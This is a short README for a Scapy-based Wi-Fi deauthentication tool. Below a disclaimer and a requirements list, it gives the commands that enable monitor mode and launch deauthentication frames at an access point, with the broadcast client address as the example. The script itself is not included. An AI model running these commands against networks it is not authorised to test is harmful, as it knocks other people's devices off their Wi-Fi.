# Wi-Fi Deauthentication Tool
**A simple Python script to demonstrate Wi-Fi deauthentication attacks using Scapy.**

## ⚠️ Disclaimer
- This tool is for **educational purposes only**.
- Unauthorized use is illegal. Use only on networks you own or have explicit permission to test.

## Requirements
- Kali Linux (or any Linux distro with monitor mode support)
- Python 3.x
- Scapy (`sudo apt install python3-scapy`)

## Usage
1. Put your wireless interface into monitor mode:
   ```bash
   sudo airmon-ng start <interface>
sudo python3 deauth_tool.py -a <AP_MAC> -c <CLIENT_MAC> -i <INTERFACE> -n 100

sudo python3 deauth_tool.py -a 00:11:22:33:44:55 -c FF:FF:FF:FF:FF:FF -i wlan0mon -n 100
